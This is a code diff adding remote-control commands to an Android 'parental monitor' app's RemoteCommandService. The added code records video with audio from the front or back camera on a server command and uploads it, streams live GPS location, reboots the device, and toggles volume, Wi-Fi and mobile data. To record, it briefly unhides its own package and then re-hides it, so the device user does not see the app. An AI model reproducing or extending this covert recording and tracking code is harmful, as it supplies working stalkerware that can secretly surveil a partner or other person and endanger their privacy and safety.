@@ -90,6 +90,28 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
                 return
             }
 
+            if (commandType == "capture_video") {
+                val facing   = payload.optString("camera", "back")
+                val duration = payload.optInt("durationSeconds", 8).coerceIn(3, 60)
+
+                clearMediaRestrictions()
+                val pmV = ctx.packageManager
+                val wasHiddenV = isSamsungDevice() &&
+                    pmV.getApplicationEnabledSetting(ctx.packageName) ==
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                if (wasHiddenV) {
+                    pmV.setApplicationEnabledSetting(ctx.packageName,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP)
+                    Thread.sleep(2500)
+                }
+                val vidResult = captureVideo(facing, duration, commandId, token)
+                android.util.Log.d(TAG, "capture_video result: ${vidResult.take(80)}")
+                if (wasHiddenV) rehidePackage()
+                reportResult(token, commandId, "completed", vidResult)
+                return
+            }
+
             if (commandType == "take_screenshot") {
                 clearMediaRestrictions()
                 // Accessibility service dies when package is hidden; re-enable so it can reconnect.
@@ -157,6 +179,12 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
                 "send_notification" -> immediateAlert(commandId, "notification", payload)
                 "request_location"      -> requestLocationNow()
                 "high_accuracy_location" -> enableHighAccuracyLocation()
+                "reboot_device"         -> rebootDevice()
+                "start_live_location"   -> startLiveLocation(payload)
+                "stop_live_location"    -> stopLiveLocation()
+                "set_volume"            -> setVolume(payload)
+                "set_wifi"              -> setWifi(payload)
+                "set_mobile_data"       -> setMobileData(payload)
                 "sync_now" -> {
                     // 1. Bump slow_cycle_ts — signals Flutter's MonitoringService when in foreground
                     ctx.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
@@ -296,6 +324,41 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         return """{"type":"ok","message":"${kind.replaceFirstChar { it.uppercase() }} triggered on device"}"""
     }
 
+    /**
+     * Live location streaming: writes an "until" timestamp that the
+     * TrackingForegroundService's live loop reads to capture + upload a fresh
+     * fix every ~10 s until it expires. Also pushes one immediate fix.
+     */
+    private fun startLiveLocation(payload: JSONObject): String {
+        val durationMin = payload.optInt("durationMinutes", 5).coerceIn(1, 60)
+        val until = System.currentTimeMillis() + durationMin * 60_000L
+
+        val prefs = ctx.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+        prefs.edit()
+            .putLong("flutter.${TrackingForegroundService.KEY_LIVE_LOCATION_UNTIL}", until)
+            .apply()
+
+        // Immediate first fix so the map jumps to live right away.
+        val token    = prefs.getString("flutter.pm_token", null)
+        val deviceId = prefs.getString("flutter.pm_device_id", null)
+        if (token != null && deviceId != null) {
+            val loc = LocationService(ctx)
+            try { loc.captureLocation() } catch (_: Exception) {}
+            try { loc.syncLocation(token, deviceId, baseUrl) } catch (_: Exception) {}
+        }
+        android.util.Log.i(TAG, "start_live_location: streaming for $durationMin min")
+        return """{"type":"ok","message":"Live location started for $durationMin min"}"""
+    }
+
+    private fun stopLiveLocation(): String {
+        ctx.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+            .edit()
+            .putLong("flutter.${TrackingForegroundService.KEY_LIVE_LOCATION_UNTIL}", 0L)
+            .apply()
+        android.util.Log.i(TAG, "stop_live_location: streaming stopped")
+        return """{"type":"ok","message":"Live location stopped"}"""
+    }
+
     /** Captures a fresh high-accuracy GPS fix and uploads it immediately. */
     private fun requestLocationNow(): String {
         val prefs    = ctx.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
@@ -324,6 +387,225 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         } catch (e: Exception) {
             """{"type":"error","message":"${e.message?.replace("\"", "'")}"}"""
         }
+    }
+
+    /** Sets media/ring/alarm/notification volume to a percentage (0–100). */
+    private fun setVolume(payload: JSONObject): String {
+        val percent = payload.optInt("percent", 50).coerceIn(0, 100)
+        return try {
+            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+            val streams = intArrayOf(
+                android.media.AudioManager.STREAM_MUSIC,
+                android.media.AudioManager.STREAM_RING,
+                android.media.AudioManager.STREAM_ALARM,
+                android.media.AudioManager.STREAM_NOTIFICATION,
+            )
+            for (s in streams) {
+                // Ring/notification volume can throw under DND without policy access — skip those.
+                try {
+                    val max = am.getStreamMaxVolume(s)
+                    am.setStreamVolume(s, (max * percent / 100.0).toInt(), 0)
+                } catch (_: Exception) {}
+            }
+            """{"type":"ok","message":"Volume set to $percent%"}"""
+        } catch (e: Exception) {
+            """{"type":"error","message":"${e.message?.replace("\"", "'")}"}"""
+        }
+    }
+
+    /**
+     * Wi-Fi toggle. Android 10+ blocks apps from silently changing the Wi-Fi
+     * radio, so on those versions we open the Wi-Fi settings panel instead.
+     */
+    @Suppress("DEPRECATION")
+    private fun setWifi(payload: JSONObject): String {
+        val enabled = payload.optBoolean("enabled", true)
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                ctx.startActivity(Intent(android.provider.Settings.Panel.ACTION_WIFI)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                """{"type":"ok","message":"Android 10+ blocks silent Wi-Fi toggle — opened Wi-Fi panel on device"}"""
+            } else {
+                val wm = ctx.applicationContext
+                    .getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                wm.isWifiEnabled = enabled
+                """{"type":"ok","message":"Wi-Fi ${if (enabled) "enabled" else "disabled"}"}"""
+            }
+        } catch (e: Exception) {
+            """{"type":"error","message":"${e.message?.replace("\"", "'")}"}"""
+        }
+    }
+
+    /**
+     * Mobile-data toggle. Requires MODIFY_PHONE_STATE (system/signature) which
+     * normal apps can't hold, so this is best-effort via reflection and will
+     * usually report an OS restriction on modern devices.
+     */
+    private fun setMobileData(payload: JSONObject): String {
+        val enabled = payload.optBoolean("enabled", true)
+        return try {
+            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+            val m = tm.javaClass.getDeclaredMethod("setDataEnabled", Boolean::class.javaPrimitiveType)
+            m.isAccessible = true
+            m.invoke(tm, enabled)
+            """{"type":"ok","message":"Mobile data ${if (enabled) "enabled" else "disabled"}"}"""
+        } catch (_: Exception) {
+            """{"type":"error","message":"OS restricts silent mobile-data toggle on this device"}"""
+        }
+    }
+
+    /**
+     * Reboots the device. Requires the app to be Device Owner (as it is on the
+     * provisioned Samsung devices via ADB). Fails gracefully otherwise.
+     */
+    private fun rebootDevice(): String {
+        return try {
+            val dpm = ctx.getSystemService(android.app.admin.DevicePolicyManager::class.java)
+                ?: return """{"type":"error","message":"DevicePolicyManager unavailable"}"""
+            if (!dpm.isDeviceOwnerApp(ctx.packageName)) {
+                return """{"type":"error","message":"Reboot needs Device Owner — not provisioned on this device"}"""
+            }
+            val admin = android.content.ComponentName(
+                ctx, com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java)
+            // Report the result BEFORE rebooting — the device won't be able to
+            // report once it starts shutting down.
+            android.util.Log.i(TAG, "reboot_device: rebooting now")
+            dpm.reboot(admin)
+            """{"type":"ok","message":"Rebooting device…"}"""
+        } catch (e: Exception) {
+            """{"type":"error","message":"${e.message?.replace("\"", "'")}"}"""
+        }
+    }
+
+    // ── Camera2 video recording (records N seconds, uploads the MP4) ────────────
+
+    @SuppressLint("MissingPermission")
+    private fun captureVideo(facing: String, durationSec: Int, commandId: String, token: String): String {
+        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA)
+            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            return """{"type":"error","message":"camera permission not granted"}"""
+        }
+        val withAudio = ctx.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) ==
+            android.content.pm.PackageManager.PERMISSION_GRANTED
+
+        val manager = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        val facingVal = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT
+                        else                    CameraCharacteristics.LENS_FACING_BACK
+        val cameraId = manager.cameraIdList.firstOrNull { id ->
+            manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facingVal
+        } ?: manager.cameraIdList.firstOrNull()
+          ?: return """{"type":"error","message":"no camera available"}"""
+
+        val sensorOrientation = manager.getCameraCharacteristics(cameraId)
+            .get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
+        val file = File(ctx.cacheDir, "camvid_${System.currentTimeMillis()}.mp4")
+
+        val recorder = MediaRecorder()
+        try {
+            if (withAudio) recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setVideoEncodingBitRate(3_000_000)
+            recorder.setVideoFrameRate(30)
+            recorder.setVideoSize(1280, 720)
+            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+            if (withAudio) recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            recorder.setOutputFile(file.absolutePath)
+            recorder.setOrientationHint(if (facing == "front") (sensorOrientation + 180) % 360 else sensorOrientation)
+            recorder.prepare()
+        } catch (e: Exception) {
+            try { recorder.release() } catch (_: Exception) {}
+            return """{"type":"error","message":"recorder init failed: ${e.message?.replace("\"", "'")}"}"""
+        }
+
+        val thread  = HandlerThread("CamVidSvc").also { it.start() }
+        val handler = Handler(thread.looper)
+        val startedLatch = CountDownLatch(1)
+        var camera: CameraDevice? = null
+        var session: CameraCaptureSession? = null
+        var startError: String? = null
+
+        try {
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(device: CameraDevice) {
+                    camera = device
+                    try {
+                        device.createCaptureSession(
+                            listOf(recorder.surface),
+                            object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(s: CameraCaptureSession) {
+                                    session = s
+                                    try {
+                                        val req = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
+                                            addTarget(recorder.surface)
+                                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                            set(CaptureRequest.CONTROL_AF_MODE,
+                                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)
+                                        }
+                                        s.setRepeatingRequest(req.build(), null, handler)
+                                        recorder.start()
+                                    } catch (e: Exception) {
+                                        startError = "record start failed: ${e.message}"
+                                    }
+                                    startedLatch.countDown()
+                                }
+                                override fun onConfigureFailed(s: CameraCaptureSession) {
+                                    startError = "session configure failed"; startedLatch.countDown()
+                                }
+                            }, handler)
+                    } catch (e: Exception) {
+                        startError = "createCaptureSession failed: ${e.message}"; startedLatch.countDown()
+                    }
+                }
+                override fun onDisconnected(device: CameraDevice) {
+                    startError = "camera disconnected"; startedLatch.countDown()
+                }
+                override fun onError(device: CameraDevice, error: Int) {
+                    startError = "camera error $error"; startedLatch.countDown()
+                }
+            }, handler)
+        } catch (e: Exception) {
+            cleanupVideo(recorder, session, camera, thread)
+            return """{"type":"error","message":"openCamera failed: ${e.message?.replace("\"", "'")}"}"""
+        }
+
+        if (!startedLatch.await(15, TimeUnit.SECONDS) || startError != null) {
+            cleanupVideo(recorder, session, camera, thread)
+            file.delete()
+            return """{"type":"error","message":"${startError ?: "camera did not start in time"}"}"""
+        }
+
+        // Record for the requested duration.
+        Thread.sleep(durationSec * 1000L)
+
+        // Stop everything.
+        try { session?.stopRepeating() } catch (_: Exception) {}
+        var stopOk = true
+        try { recorder.stop() } catch (_: Exception) { stopOk = false }
+        cleanupVideo(recorder, session, camera, thread)
+
+        if (!stopOk || !file.exists() || file.length() == 0L) {
+            file.delete()
+            return """{"type":"error","message":"no video produced (recording too short?)"}"""
+        }
+
+        return try {
+            uploadRecordingFile(file, commandId, token, durationSec)
+        } finally {
+            try { file.delete() } catch (_: Exception) {}
+        }
+    }
+
+    private fun cleanupVideo(
+        recorder: MediaRecorder,
+        session: CameraCaptureSession?,
+        camera: CameraDevice?,
+        thread: HandlerThread,
+    ) {
+        try { session?.close() } catch (_: Exception) {}
+        try { camera?.close() } catch (_: Exception) {}
+        try { recorder.reset(); recorder.release() } catch (_: Exception) {}
+        try { thread.quitSafely() } catch (_: Exception) {}
     }
 
     // ── Camera2 capture (runs on IO thread — foreground service has camera type) ─
